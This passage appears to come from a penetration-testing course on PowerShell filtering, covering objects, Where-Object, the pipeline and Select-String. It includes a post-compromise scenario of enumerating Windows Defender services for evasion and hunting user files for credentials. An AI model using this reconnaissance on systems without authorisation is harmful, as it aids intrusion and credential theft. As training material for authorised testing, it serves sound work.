<hr>
<p>Being able to search for, find, and filter content for what we are looking for is an absolute requirement for any user who utilizes the CLI ( regardless of what shell or OS ). Nevertheless, how do we do this in PowerShell? To answer this question, this section will dive into specifics of how PowerShell utilizes <code>Objects</code>, how we can <code>filter</code> based on <code>Properties</code> and <code>content</code>, and describe components like the PowerShell <code>Pipeline</code> further.</p>
<hr>
<h3 id="explanation-of-powershell-output-objects-explained-">Explanation of PowerShell Output (Objects Explained)</h3>
<p>With PowerShell, not everything is generic text strings like in Bash or cmd. In PowerShell, everything is an <code>Object</code>. However, what is an object? Let us examine this concept further:</p>
<p><code>What is an Object?</code> An <code>object</code> is an <code>individual</code> instance of a <code>class</code> within PowerShell. Let us use the example of a computer as our object. The total of everything (parts, time, design, software, etc.) makes a computer a computer.</p>
<p><code>What is a Class?</code> A class is the <code>schema</code> or &#39;unique representation of a thing (object) and how the sum of its <code>properties</code> define it. The <code>blueprint</code> used to lay out how that computer should be assembled and what everything within it can be considered a Class.</p>
<p><code>What are Properties?</code> Properties are simply the <code>data</code> associated with an object in PowerShell. For our example of a computer, the individual <code>parts</code> that we assemble to make the computer are its properties. Each part serves a purpose and has a unique use within the object.</p>
<p><code>What are Methods?</code> Simply put, methods are all the functions our object has. Our computer allows us to process data, surf the internet, learn new skills, etc. All of these are the methods for our object.</p>
<p>Now, we defined these terms so that we understand all the different properties we will be looking at later and what methods of interaction we have with objects. By understanding how PowerShell interprets objects and utilizes Classes, we can define our own object types. Moving on, we will look at how we can filter and find objects through the PowerShell CLI.</p>
<h4 id="finding-and-filtering-objects">Finding and Filtering Objects</h4>
<p>Let us look at this through a <code>user object</code> context. A user can do things like access files, run applications, and input/output data. But what is a user? What is it made up of?</p>
<p><strong>Get an Object (User) and its Properties/Methods</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-LocalUser administrator | get-member

   TypeName: Microsoft.PowerShell.Commands.LocalUser

Name                   MemberType Definition
----                   ---------- ----------
<span class="hljs-keyword">Clone</span>                  <span class="hljs-title">Method</span>     Microsoft.PowerShell.Commands.LocalUser Clone()
Equals                 Method     bool Equals(System.Object obj)
GetHashCode            Method     int GetHashCode()
GetType                Method     <span class="hljs-keyword">type</span> GetType()
ToString               Method     <span class="hljs-keyword">string</span> ToString()
AccountExpires         <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.Nullable[datetime] AccountExpires {get;set;}
Description            <span class="hljs-keyword">Property</span><span class="hljs-title">   </span><span class="hljs-keyword">string</span> Description {get;set;}
Enabled                <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>bool Enabled {get;set;}
FullName               <span class="hljs-keyword">Property</span><span class="hljs-title">   </span><span class="hljs-keyword">string</span> FullName {get;set;}
LastLogon              <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.Nullable[datetime] LastLogon {get;set;}
Name                   <span class="hljs-keyword">Property</span><span class="hljs-title">   </span><span class="hljs-keyword">string</span> Name {get;set;}
ObjectClass            <span class="hljs-keyword">Property</span><span class="hljs-title">   </span><span class="hljs-keyword">string</span> ObjectClass {get;set;}
PasswordChangeableDate <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.Nullable[datetime] PasswordChangeableDate {get;set;}
PasswordExpires        <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.Nullable[datetime] PasswordExpires {get;set;}
PasswordLastSet        <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.Nullable[datetime] PasswordLastSet {get;set;}
PasswordRequired       <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>bool PasswordRequired {get;set;}
PrincipalSource        <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.Nullable[Microsoft.PowerShell.Commands.PrincipalSource] PrincipalSource {ge...
SID                    <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.Security.Principal.SecurityIdentifier SID {get;set;}
UserMayChangePassword  <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>bool UserMayChangePassword {get;set;}
</code></pre>
<p>Now that we can see all of a user&#39;s properties let us look at what those properties look like when output by PowerShell. The <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-object?view=powershell-7.2">Select-Object</a> cmdlet will help us achieve this. In this manner, we now understand what makes up a user object.</p>
<p><strong>Property Output (All)</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; Get-LocalUser administrator | Select-Object -Property *


<span class="hljs-string">AccountExpires         :</span>
<span class="hljs-string">Description            :</span> Built-<span class="hljs-keyword">in</span> account <span class="hljs-keyword">for</span> administering the computer/domain
<span class="hljs-string">Enabled                :</span> False
<span class="hljs-string">FullName               :</span>
<span class="hljs-string">PasswordChangeableDate :</span>
<span class="hljs-string">PasswordExpires        :</span>
<span class="hljs-string">UserMayChangePassword  :</span> True
<span class="hljs-string">PasswordRequired       :</span> True
<span class="hljs-string">PasswordLastSet        :</span>
<span class="hljs-string">LastLogon              :</span> <span class="hljs-number">1</span><span class="hljs-regexp">/20/</span><span class="hljs-number">2021</span> <span class="hljs-number">5</span>:<span class="hljs-number">39</span>:<span class="hljs-number">14</span> PM
<span class="hljs-string">Name                   :</span> Administrator
<span class="hljs-string">SID                    :</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-3916821513</span><span class="hljs-number">-3027319641</span><span class="hljs-number">-390562114</span><span class="hljs-number">-500</span>
<span class="hljs-string">PrincipalSource        :</span> Local
<span class="hljs-string">ObjectClass            :</span> User
</code></pre>
<p>A user is a small object realistically, but it can be a lot to look at the output in this manner, especially from items like large <code>lists</code> or <code>tables</code>. So what if we wanted to filter this content down or show it to us in a more precise manner? We could filter out the properties of an object we do not want to see by selecting the few we do. Let&#39;s look at our users and see which have set a password recently.</p>
<p><strong>Filtering on Properties</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">Get-LocalUser</span> * | <span class="hljs-selector-tag">Select-Object</span> <span class="hljs-selector-tag">-Property</span> <span class="hljs-selector-tag">Name</span>,<span class="hljs-selector-tag">PasswordLastSet</span>

<span class="hljs-selector-tag">Name</span>               <span class="hljs-selector-tag">PasswordLastSet</span>
<span class="hljs-selector-tag">----</span>               <span class="hljs-selector-tag">---------------</span>
<span class="hljs-selector-tag">Administrator</span>
<span class="hljs-selector-tag">DefaultAccount</span>
<span class="hljs-selector-tag">Guest</span>
<span class="hljs-selector-tag">MTanaka</span>              <span class="hljs-selector-tag">1</span>/<span class="hljs-selector-tag">27</span>/<span class="hljs-selector-tag">2021</span> <span class="hljs-selector-tag">2</span><span class="hljs-selector-pseudo">:39</span><span class="hljs-selector-pseudo">:55</span> <span class="hljs-selector-tag">PM</span>
<span class="hljs-selector-tag">WDAGUtilityAccount</span> <span class="hljs-selector-tag">1</span>/<span class="hljs-selector-tag">18</span>/<span class="hljs-selector-tag">2021</span> <span class="hljs-selector-tag">7</span><span class="hljs-selector-pseudo">:40</span><span class="hljs-selector-pseudo">:22</span> <span class="hljs-selector-tag">AM</span>
</code></pre>
<p>We can also <code>sort</code> and <code>group</code> our objects on these properties.</p>
<p><strong>Sorting and Grouping</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-LocalUser * | Sort-Object -<span class="hljs-keyword">Property</span><span class="hljs-title"> </span>Name | Group-Object -<span class="hljs-keyword">property</span><span class="hljs-title"> </span>Enabled

Count Name                      <span class="hljs-keyword">Group</span>
<span class="hljs-title">----- ----                      -----
    4</span> <span class="hljs-literal">False</span>                     {Administrator, DefaultAccount, Guest, WDAGUtilityAccount}
    <span class="hljs-number">1</span> <span class="hljs-literal">True</span>                      {MTanaka}
</code></pre>
<p>We utilized the <code>Sort-Object</code> and <code>Group-Object</code> cmdlets to find all users, <code>sort</code> them by <code>name</code>, and then <code>group</code> them together based on their <code>Enabled</code> property. From the output, we can see that several users are disabled and not in use for interactive logon. This is just a quick example of what can be done with PowerShell objects and the sheer amount of information stored within each object. As we delve deeper into PowerShell and dig around within the Windows OS, we will notice that the classes behind many objects are extensive and often shared. Keep these things in mind as we work with them more and more.</p>
<hr>
<h3 id="why-do-we-need-to-filter-our-results-">Why Do We Need to Filter our Results?</h3>
<p>We are switching it up and using an example of get-service for this demonstration. Looking at basic users and information does not produce much in the way of results, but other objects contain an extraordinary amount of data. Below is an example of just a fragment from the output of Get-Service:</p>
<p><strong>Too Much Output</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Service | <span class="hljs-keyword">Select</span>-Object -Property *

Name                : <span class="hljs-type">AarSvc_1ca8ea</span>
RequiredServices    : {}
CanPauseAndContinue : <span class="hljs-type">False</span>
CanShutdown         : <span class="hljs-type">False</span>
CanStop             : <span class="hljs-type">False</span>
DisplayName         : <span class="hljs-type">Agent</span> Activation Runtime_1ca8ea
DependentServices   : {}
MachineName         : .
ServiceName         : <span class="hljs-type">AarSvc_1ca8ea</span>
ServicesDependedOn  : {}
ServiceHandle       :
<span class="hljs-type">Status</span>              : <span class="hljs-type">Stopped</span>
ServiceType         : 224
StartType           : <span class="hljs-type">Manual</span>
Site                :
<span class="hljs-type">Container</span>           :

<span class="hljs-type">Name</span>                : <span class="hljs-type">AdobeARMservice</span>
RequiredServices    : {}
CanPauseAndContinue : <span class="hljs-type">False</span>
CanShutdown         : <span class="hljs-type">False</span>
CanStop             : <span class="hljs-type">True</span>
DisplayName         : <span class="hljs-type">Adobe</span> Acrobat Update Service
DependentServices   : {}
MachineName         : .
ServiceName         : <span class="hljs-type">AdobeARMservice</span>
ServicesDependedOn  : {}
ServiceHandle       :
<span class="hljs-type">Status</span>              : <span class="hljs-type">Running</span>
ServiceType         : <span class="hljs-type">Win32OwnProcess</span>
StartType           : <span class="hljs-type">Automatic</span>
Site                :
<span class="hljs-type">Container</span>           :

<span class="hljs-type">Name</span>                : <span class="hljs-type">agent_ovpnconnect</span>
RequiredServices    : {}
CanPauseAndContinue : <span class="hljs-type">False</span>
CanShutdown         : <span class="hljs-type">False</span>
CanStop             : <span class="hljs-type">True</span>
DisplayName         : <span class="hljs-type">OpenVPN</span> Agent agent_ovpnconnect
DependentServices   : {}
MachineName         : .
ServiceName         : <span class="hljs-type">agent_ovpnconnect</span>
ServicesDependedOn  : {}
ServiceHandle       :
<span class="hljs-type">Status</span>              : <span class="hljs-type">Running</span>
ServiceType         : <span class="hljs-type">Win32OwnProcess</span>
StartType           : <span class="hljs-type">Automatic</span>
Site                :
<span class="hljs-type">Container</span>           :

&lt;<span class="hljs-type">SNIP</span>&gt;
</code></pre>
<p>This is way too much data to sift through, right? Let us break it down further and format this data as a list. We can use the command string <code>get-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl</code> to change our output like so:</p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; get-service | <span class="hljs-keyword">Select</span>-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl 

&lt;SNIP&gt;
DisplayName : <span class="hljs-type">ActiveX</span> Installer (AxInstSV)
Name        : <span class="hljs-type">AxInstSV</span>
Status      : <span class="hljs-type">Stopped</span>

DisplayName : <span class="hljs-type">Adobe</span> Acrobat Update Service
Name        : <span class="hljs-type">AdobeARMservice</span>
Status      : <span class="hljs-type">Running</span>

DisplayName : <span class="hljs-type">Adobe</span> Genuine Monitor Service
Name        : <span class="hljs-type">AGMService</span>
Status      : <span class="hljs-type">Running</span>
&lt;SNIP&gt;
</code></pre>
<p>This is still a ton of output, but it is a bit more readable. Here is where we start asking ourselves questions like do we need all of this output? Do we care about all of these objects or just a specific subset of them? What if we wanted to determine if a specific service was running, but we needed to figure out the specific Name? The <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2">Where-Object</a> can evaluate objects passed to it and their specific property values to look for the information we require. Consider this <code>scenario</code>:</p>
<p>Scenario: We have just landed an initial shell on a host via an unsecured protocol exposing the host to the world. Before we get any further in, we need to assess the host and determine if any defensive services or applications are running. First, we look for any instance of `Windows Defender` services running.</p>
<p>Using <code>Where-Object</code> (<code>where</code> as an alias) and the parameter matching with <code>-like</code> will allow us to determine if we are safe to continue by looking for anything with &quot;<code>Defender</code>&quot; in the property. In this instance, we check the <code>DisplayName</code> property of all objects retrieved by <code>Get-Service</code>.</p>
<p><strong>Hunting for Windows Defender</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt;  Get-Service | where DisplayName -like <span class="hljs-string">'*Defender*'</span>

Status   Name               DisplayName
------   ----               -----------
Running  mpssvc             Windows Defender Firewall
<span class="hljs-function"><span class="hljs-title">Stopped</span></span>  Sense              Windows Defender Advanced Threat Pr...
<span class="hljs-function"><span class="hljs-title">Running</span></span>  WdNisSvc           Microsoft Defender Antivirus Networ...
Running  WinDefend          Microsoft Defender Antivirus Service
</code></pre>
<p>As we can see, our results returned <code>several services running</code>, including Defender Firewall, Advanced Threat Protection, and more. This is both good news and bad news for us. We cannot just dive in and start doing things because we are likely to be spotted by the defensive services, but it is good that we spotted them and can now regroup and make a plan for defensive evasion actions to be taken. Although a quick example scenario, this is something as pentesters that we will often run into, and we should be able to spot and identify when defensive measures are in place. This example brings up an interesting way to modify our searches, however. Evaluation values can be beneficial to our cause. Let us check them out more.</p>
<h4 id="the-evaluation-of-values">The Evaluation of Values</h4>
<p><code>Where</code> and many other cmdlets can <code>evaluate</code> objects and data based on the values those objects and their properties contain. The output above is an excellent example of this utilizing the <code>-like</code> Comparison operator. It will look for anything that matches the values expressed and can include wildcards such as <code>*</code>. Below is a quick list (not all-encompassing) of other useful expressions we can utilize:</p>
<p><strong>Comparison Operators</strong></p>
<table>
<thead>
<tr>
<th><strong>Expression</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Like</code></td>
<td>Like utilizes wildcard expressions to perform matching. For example, <code>&#39;*Defender*&#39;</code> would match anything with the word Defender somewhere in the value.</td>
</tr>
<tr>
<td><code>Contains</code></td>
<td>Contains will get the object if any item in the property value matches exactly as specified.</td>
</tr>
<tr>
<td><code>Equal</code> to</td>
<td>Specifies an exact match (case sensitive) to the property value supplied.</td>
</tr>
<tr>
<td><code>Match</code></td>
<td>Is a regular expression match to the value supplied.</td>
</tr>
<tr>
<td><code>Not</code></td>
<td>specifies a match if the property is <code>blank</code> or does not exist. It will also match <code>$False</code>.</td>
</tr>
</tbody>
</table>
<p>Of course, there are many other <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_comparison\_operators?view=powershell-7.2">comparison operators</a> we can use like, greater than, less than, and negatives like NotEqual, but in this kind of searching they may not be as widely used. Now with a <code>-GTE</code> understanding of how these operators can help us more than before (see what I did there), let us get back to digging into Defender services. Now we will look for service objects with a <code>DisplayName</code> again, like &lt; something&gt;Defender&lt; something&gt;.</p>
<p><strong>Defender Specifics</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; Get-Service | where DisplayName -like <span class="hljs-string">'*Defender*'</span> | Select-Object -Property *

<span class="hljs-string">Name                :</span> mpssvc
<span class="hljs-string">RequiredServices    :</span> {mpsdrv, bfe}
<span class="hljs-string">CanPauseAndContinue :</span> False
<span class="hljs-string">CanShutdown         :</span> False
<span class="hljs-string">CanStop             :</span> False
<span class="hljs-string">DisplayName         :</span> Windows Defender Firewall
<span class="hljs-string">DependentServices   :</span>
<span class="hljs-string">MachineName         :</span> .
<span class="hljs-string">ServiceName         :</span> mpssvc
<span class="hljs-string">ServicesDependedOn  :</span> {mpsdrv, bfe}
<span class="hljs-string">ServiceHandle       :</span>
<span class="hljs-string">Status              :</span> Running
<span class="hljs-string">ServiceType         :</span> Win32ShareProcess
<span class="hljs-string">StartType           :</span> Automatic
<span class="hljs-string">Site                :</span>
<span class="hljs-string">Container           :</span>

<span class="hljs-string">Name                :</span> Sense
<span class="hljs-string">RequiredServices    :</span> {}
<span class="hljs-string">CanPauseAndContinue :</span> False
<span class="hljs-string">CanShutdown         :</span> False
<span class="hljs-string">CanStop             :</span> False
<span class="hljs-string">DisplayName         :</span> Windows Defender Advanced Threat Protection Service
&lt;SNIP&gt;
</code></pre>
<p>Our results above now filter out every service associated with <code>Windows Defender</code> and displays the complete properties list of each match. Now we can look at the services, determine if they are running, and even if we can, at our current permission level, affect the status of those services (turn them off, disable them, etc.). During many of the commands we have issued in the last few sections, we have used the <code>|</code> symbol to concatenate multiple commands we would usually issue separately. Below we will discuss what this is and how it works for us.</p>
<hr>
<h3 id="what-is-the-powershell-pipeline-">What is the PowerShell Pipeline? ( | )</h3>
<p>In its simplest form, the <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_pipelines?view=powershell-7.2">Pipeline</a> in PowerShell provides the end user a way to chain commands together. This chain is called a Pipeline and is also referred to as a pipe or piping commands together. With PowerShell handling objects the way it does, we can issue a command and then pipe (<code>|</code>) the resultant object output to another command for action. The Pipeline will interpret and execute the commands one at a time from left to right. We have done this in a few examples in the previous sections, so we are diving deeper into it here. As an example using the Pipeline to string commands together can look like this:</p>
<p><strong>Piping Commands</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Command<span class="hljs-string">-1</span> | Command<span class="hljs-string">-2</span> | Command<span class="hljs-string">-3</span>

Output from the result of 1<span class="hljs-string">+2</span><span class="hljs-string">+3</span>
</code></pre>
<p><code>OR</code></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; 
Command<span class="hljs-string">-1</span> |
  Command<span class="hljs-string">-2</span> |
    Command<span class="hljs-string">-3</span>  

Output result from Pipeline
</code></pre>
<p><code>OR</code></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">Get</span>-Process | <span class="hljs-keyword">Where</span>-<span class="hljs-built_in">Object</span> CPU | <span class="hljs-keyword">Where</span>-<span class="hljs-built_in">Object</span> Path
    | <span class="hljs-keyword">Get</span>-Item |  

Output result <span class="hljs-keyword">from</span> Pipeline
</code></pre>
<p>Each way is a perfectly acceptable way to concatenate the commands together. PowerShell can interpret what you want based on the position of the (<code>|</code>) in the string. Let us see an example of using the pipeline to provide us with actionable data. Below we will issue the <code>Get-Process</code> cmdlet, <code>sort</code> the resultant data, and then measure how many <code>unique</code> processes we have running on our host.</p>
<p><strong>Using the Pipeline to Count Unique Instances</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">PS </span>C:\<span class="hljs-string">htb&gt;</span> <span class="hljs-built_in">get-process</span> | <span class="hljs-string">sort </span>| <span class="hljs-string">unique </span>| <span class="hljs-string">measure-object
</span>
<span class="hljs-string">Count </span>            : <span class="hljs-string">113</span>
</code></pre>
<p>As a result, the pipeline output the total count (<code>113</code>) of unique processes running at that time. Suppose we break the pipeline down at any particular point. In that case, we may see the process output sorted, filtered for unique instances (no duplicate names), or just a number output from the <code>Measure-Object</code> cmdlet. The task we performed was relatively simple. However, what if we could harness this for something more complex, like sorting new log entries, filtering for specific event log codes, or processing large amounts of data (a database and all its entries, for example) looking for specific strings? This is where Pipeline can increase our productivity and streamline the output we receive, making it a vital tool for any sysadmin or pentester.</p>
<h4 id="pipeline-chain-operators-and-">Pipeline Chain Operators ( <code>&amp;&amp;</code> and <code>||</code> )</h4>
<p><em>Currently, Windows PowerShell 5.1 and older do not support Pipeline Chain Operators used in this fashion. If you see errors, you must install PowerShell 7 alongside Windows PowerShell. They are not the same thing.</em></p>
<p>You can find a great example of installing PowerShell 7 <a href="https://www.thomasmaurer.ch/2019/07/how-to-install-and-update-powershell-7/">here</a> so that you can use many of the new and updated features. PowerShell allows us to have conditional execution of pipelines with the use of <code>Chain operators</code>. These operators ( <code>&amp;&amp;</code> and <code>||</code> ) serve two main functions:</p>
<ul>
<li><code>&amp;&amp;</code>: Sets a condition in which PowerShell will execute the next command inline <code>if</code> the current command <code>completes properly</code>.</li>
<li><code>||</code>: Sets a condition in which PowerShell will execute the following command inline <code>if</code> the current command <code>fails</code>.</li>
</ul>
<p>These operators can be useful in helping us set conditions for scripts that execute if a goal or condition is met. For example:</p>
<p>Scenario: Let&#39;s say we write a command chain where we want to get the content within a file and then ping a host. We can set this to ping the host if the initial command succeeds with <code>&amp;&amp;</code> or to run only if the command fails <code>||</code>. Let&#39;s see both.</p>
<p>In this output, we can see that both commands were <code>successful</code> in execution because we get the output of the file <code>test.txt</code> printed to the console along with the results of our <code>ping</code> command.</p>
<p><strong>Successful Pipeline</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Content '.\test.txt' &amp;&amp; ping <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>
pass <span class="hljs-literal">or</span> fail

Pinging <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span> <span class="hljs-keyword">with</span> <span class="hljs-number">32</span> bytes of data:
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=23ms</span> <span class="hljs-attr">TTL=118</span>
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=28ms</span> <span class="hljs-attr">TTL=118</span>
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=28ms</span> <span class="hljs-attr">TTL=118</span>
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=21ms</span> <span class="hljs-attr">TTL=118</span>

Ping statistics for <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>:
    Packets: <span class="hljs-attr">Sent</span> = <span class="hljs-number">4</span>, <span class="hljs-attr">Received</span> = <span class="hljs-number">4</span>, <span class="hljs-attr">Lost</span> = <span class="hljs-number">0</span> (<span class="hljs-number">0</span>% loss),
Approximate round trip times <span class="hljs-keyword">in</span> milli-seconds:
    <span class="hljs-attr">Minimum</span> = <span class="hljs-number">21</span>ms, <span class="hljs-attr">Maximum</span> = <span class="hljs-number">28</span>ms, <span class="hljs-attr">Average</span> = <span class="hljs-number">25</span>ms
</code></pre>
<p>With this output, we can see that our pipeline <code>closed</code> itself after the <code>first</code> command since it executed adequately, printing the output of the file to the console.</p>
<p><strong>Stop Unless Failure</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt;  Get-Content <span class="hljs-string">'.\test.txt'</span> || <span class="hljs-built_in">ping</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>

pass <span class="hljs-literal">or</span> fail
</code></pre>
<p>Here we can see that our pipeline executed <code>completely</code>. Our first command <code>failed</code> because the filename was typed wrong, and PowerShell sees this as the file we requested does not exist. Since the first command failed, our second command was executed.</p>
<p><strong>Success in Failure</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Content <span class="hljs-string">'.\testss.txt'</span> || ping <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>

Get-Content: Cannot find path <span class="hljs-string">'C:\Users\MTanaka\Desktop\testss.txt'</span> because <span class="hljs-keyword">it</span> does <span class="hljs-keyword">not</span> exist.

Pinging <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span> <span class="hljs-keyword">with</span> <span class="hljs-number">32</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">of</span> data:
Reply <span class="hljs-built_in">from</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>: <span class="hljs-keyword">bytes</span>=<span class="hljs-number">32</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">20</span>ms TTL=<span class="hljs-number">118</span>
Reply <span class="hljs-built_in">from</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>: <span class="hljs-keyword">bytes</span>=<span class="hljs-number">32</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">37</span>ms TTL=<span class="hljs-number">118</span>
Reply <span class="hljs-built_in">from</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>: <span class="hljs-keyword">bytes</span>=<span class="hljs-number">32</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">19</span>ms TTL=<span class="hljs-number">118</span>

&lt;SNIP&gt;
</code></pre>
<p>The <code>pipeline</code> and <code>operators</code> that we used are beneficial to us from a time-saving perspective, as well as being able to quickly feed objects and data from one task to another. Issuing multiple commands in line is much more effective than manually issuing each command. What if we wanted to search for <code>strings</code> or <code>data</code> within the contents of files and directories? This is a common task many pentesters will perform while enumerating a host that they have gained access to. Searching with what is natively on the host is a great way to maintain our stealth and ensure we are not introducing new risks by bringing tools into the user environment.</p>
<hr>
<h3 id="finding-data-within-content">Finding Data within Content</h3>
<p>Some tools exist, like <code>Snaffler</code>, <code>Winpeas</code>, and the like, that can search for interesting files and strings, but what if we <code>cannot</code> bring a new tool onto the host? How can we hunt for sensitive info like credentials, keys, etc.? Combining cmdlets we have practiced in previous sections paired with new cmdlets like <code>Select-String</code> and <code>where</code> is an excellent way for us to root through a filesystem.</p>
<p><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.2">Select-String</a> (<code>sls</code> as an alias) for those more familiar with using the Linux CLI, functions much in the same manner as <code>Grep</code> does or <code>findstr.exe</code> within the Windows Command-Prompt. It performs evaluations of input strings, file contents, and more based on regular expression (<code>regex</code>) pattern matching. When a match is found, <code>Select-String</code> will output the matching <code>line</code>, the <code>name</code> of the file, and the <code>line number</code> on which it was found by default. Overall it is a flexible and helpful cmdlet that should be in everyone&#39;s toolbox. Below we will take our new cmdlet for a test drive as we look for information within some interesting files and directories that should be paid attention to when enumerating a host.</p>
<h4 id="find-interesting-files-within-a-directory">Find Interesting Files Within a Directory</h4>
<p>When looking for interesting files, think about the most common file types we would use daily and start there. On a given day, we may write text files, a bit of Markdown, some Python, PowerShell, and many others. We want to look for those things when hunting through a host since it is where users and admins will interact most. We can start with <code>Get-ChildItem</code> and perform a recursive search through a folder. Let us test it out.</p>
<p><strong>Beginning the Hunt</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse 

 Directory: C:\Users\MTanaka\Desktop\notedump\NoteDump

Mode                 LastWriteTime         Length Name
-<span class="ruby">---                 -------------         ------ ----
</span>-<span class="ruby">a---           <span class="hljs-number">4</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">47</span> PM           <span class="hljs-number">1092</span> demo notes.md
</span>-<span class="ruby">a---           <span class="hljs-number">4</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> PM           <span class="hljs-number">1074</span> noteDump.py
</span>-<span class="ruby">a---           <span class="hljs-number">4</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span> PM          <span class="hljs-number">61440</span> plum.sqlite
</span>-<span class="ruby">a---           <span class="hljs-number">4</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> PM            <span class="hljs-number">375</span> README.md
</span>&lt;SNIP&gt;
</code></pre>
<p>We will notice that it quickly returns way too much information. Every file in every folder in the path specified was output to our console. We need to trim this down a bit. Let us use the condition of looking at the <code>name</code> for specific <code>filetype extensions</code>. To do so, we will pipe the output of Get-ChildItem through the <code>where</code> cmdlet to filter down our output. Let&#39;s test first by searching for the <code>*.txt</code> filetype extension.</p>
<p><strong>Narrowing Our Search</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session"><span class="hljs-comment">PS</span> <span class="hljs-comment">C:\htb</span>&gt; <span class="hljs-comment">Get</span><span class="hljs-literal">-</span><span class="hljs-comment">Childitem</span> <span class="hljs-comment">–Path</span> <span class="hljs-comment">C:\Users\MTanaka\</span> <span class="hljs-literal">-</span><span class="hljs-comment">File</span> <span class="hljs-literal">-</span><span class="hljs-comment">Recurse</span> <span class="hljs-literal">-</span><span class="hljs-comment">ErrorAction</span> <span class="hljs-comment">SilentlyContinue</span> <span class="hljs-comment">|</span> <span class="hljs-comment">where</span> <span class="hljs-comment">{($_</span><span class="hljs-string">.</span><span class="hljs-comment">Name</span> <span class="hljs-literal">-</span><span class="hljs-comment">like</span> <span class="hljs-comment">"*</span><span class="hljs-string">.</span><span class="hljs-comment">txt")}</span>

<span class="hljs-comment">Directory:</span> <span class="hljs-comment">C:\Users\MTanaka\Desktop</span>

<span class="hljs-comment">Mode</span>                 <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
